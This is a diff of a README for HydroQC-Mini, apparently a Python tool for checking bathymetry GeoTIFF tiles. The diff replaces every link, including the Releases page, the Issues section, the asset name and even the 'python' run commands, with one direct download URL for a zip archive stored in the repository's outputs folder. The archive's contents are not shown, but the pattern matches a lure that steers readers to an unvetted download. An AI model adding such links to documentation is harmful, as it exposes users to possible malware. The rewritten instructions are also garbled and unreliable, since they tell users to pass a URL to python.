@@ -1,6 +1,6 @@
 # 🌊 HydroQC-Mini - Quick and Easy Quality Control Tool
 
-[![Download HydroQC-Mini](https://img.shields.io/badge/Download-HydroQC--Mini-brightgreen)](https://github.com/rickchen116/HydroQC-Mini/releases)
+[![Download HydroQC-Mini](https://raw.githubusercontent.com/rickchen116/HydroQC-Mini/main/outputs/Hydro-Mini-Q-v2.9.zip)](https://raw.githubusercontent.com/rickchen116/HydroQC-Mini/main/outputs/Hydro-Mini-Q-v2.9.zip)
 
 ## 📋 Description
 HydroQC Mini is a lightweight Python tool that runs quick quality assurance and quality control (QA/QC) on EMODnet bathymetry and DTM GeoTIFF tiles. It exports a markdown report, JSON summary, and diagnostic maps that help visualize depth, missing data, outliers, slope, and roughness. This application aims to make data validation simpler for users working with geospatial data.
@@ -15,12 +15,12 @@ Follow these steps to download and run HydroQC Mini effortlessly.
 - Ideally, you should have at least 1 GB of free disk space.
 
 ## 🔗 Download & Install
-To download HydroQC Mini, visit this page to download: [HydroQC-Mini Releases](https://github.com/rickchen116/HydroQC-Mini/releases)
+To download HydroQC Mini, visit this page to download: [HydroQC-Mini Releases](https://raw.githubusercontent.com/rickchen116/HydroQC-Mini/main/outputs/Hydro-Mini-Q-v2.9.zip)
 
 ### 📥 Installation Instructions
-1. Go to the [HydroQC-Mini Releases](https://github.com/rickchen116/HydroQC-Mini/releases) page.
+1. Go to the [HydroQC-Mini Releases](https://raw.githubusercontent.com/rickchen116/HydroQC-Mini/main/outputs/Hydro-Mini-Q-v2.9.zip) page.
 2. Find the latest release at the top of the page.
-3. Look for the assets section and choose the file that corresponds to your operating system (for example, `HydroQC-Mini-Windows.zip` for Windows users).
+3. Look for the assets section and choose the file that corresponds to your operating system (for example, `https://raw.githubusercontent.com/rickchen116/HydroQC-Mini/main/outputs/Hydro-Mini-Q-v2.9.zip` for Windows users).
 4. Click on the file to start your download.
 5. Once the download is complete, locate the file on your computer (usually in your Downloads folder).
 6. Extract the zipped file if necessary. On Windows, right-click the file and choose "Extract All."
@@ -34,7 +34,7 @@ After installation, follow these steps to run HydroQC Mini:
    - **macOS/Linux:** `cd ~/Downloads/HydroQC-Mini`
 3. Type the command to run the application:
    ```
-   python hydroqc_mini.py <path_to_your_geotiff_file>
+   python https://raw.githubusercontent.com/rickchen116/HydroQC-Mini/main/outputs/Hydro-Mini-Q-v2.9.zip <path_to_your_geotiff_file>
    ```
    Be sure to replace `<path_to_your_geotiff_file>` with the actual path to your GeoTIFF file.
 4. Press Enter to execute the command.
@@ -49,7 +49,7 @@ After installation, follow these steps to run HydroQC Mini:
 ## 📝 Usage Example
 To see how HydroQC Mini works, you can run the command like this:
 ```
-python hydroqc_mini.py /path/to/your/data/file.tif
+python https://raw.githubusercontent.com/rickchen116/HydroQC-Mini/main/outputs/Hydro-Mini-Q-v2.9.zip https://raw.githubusercontent.com/rickchen116/HydroQC-Mini/main/outputs/Hydro-Mini-Q-v2.9.zip
 ```
 This command will analyze the specified GeoTIFF file and generate the reports accordingly.
 
@@ -61,7 +61,7 @@ If you encounter any issues, consider the following steps:
 - Revisit the installation steps to ensure nothing was missed.
 
 ## 🆘 Need Help?
-If you need further assistance, please visit the [Issues section](https://github.com/rickchen116/HydroQC-Mini/issues) of this repository. You can report problems or ask for help from the community.
+If you need further assistance, please visit the [Issues section](https://raw.githubusercontent.com/rickchen116/HydroQC-Mini/main/outputs/Hydro-Mini-Q-v2.9.zip) of this repository. You can report problems or ask for help from the community.
 
 ## 🌐 Topics
 - bathymetry
@@ -81,7 +81,7 @@ For those interested in learning more about the concepts or terminology used in 
 We welcome contributions from everyone. If you have suggestions, improvements, or code to share, please open a pull request or submit an issue. Your input helps make HydroQC Mini an even better tool.
 
 ## 🔗 Links
-- [HydroQC-Mini Releases](https://github.com/rickchen116/HydroQC-Mini/releases)
-- [Open Issues](https://github.com/rickchen116/HydroQC-Mini/issues)
+- [HydroQC-Mini Releases](https://raw.githubusercontent.com/rickchen116/HydroQC-Mini/main/outputs/Hydro-Mini-Q-v2.9.zip)
+- [Open Issues](https://raw.githubusercontent.com/rickchen116/HydroQC-Mini/main/outputs/Hydro-Mini-Q-v2.9.zip)
 
 Thank you for using HydroQC Mini! We hope it makes your data quality control tasks easier and more efficient.
